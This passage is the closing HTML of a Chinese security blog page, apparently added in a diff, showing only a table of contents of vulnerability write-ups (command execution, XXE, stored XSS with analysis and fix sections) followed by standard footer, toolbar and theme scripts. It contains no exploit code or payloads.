href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-1"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E5%A4%84%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">插件安装处存在命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-2"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%AE%89%E8%A3%85%E5%A4%84%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">模板安装处存在命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-3"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E-WordPress-%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%96%87%E7%AB%A0%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8-XXE-%E6%BC%8F%E6%B4%9E-%E5%9C%A8%E5%AF%B9%E5%BA%94%E7%9A%84%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%EF%BC%8CV4-2-%E4%B8%8D%E8%A1%8C"><span class="nav-text">从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-4"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E5%A4%84%E5%AD%98%E5%9C%A8%E5%AD%98%E5%82%A8%E5%9E%8B-XSS-%E5%9C%A8%E5%AF%B9%E5%BA%94%E7%9A%84%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%EF%BC%8CV4-2-%E4%B8%8D%E8%A1%8C"><span class="nav-text">模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-5"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x04 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">0x05 参考链接</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
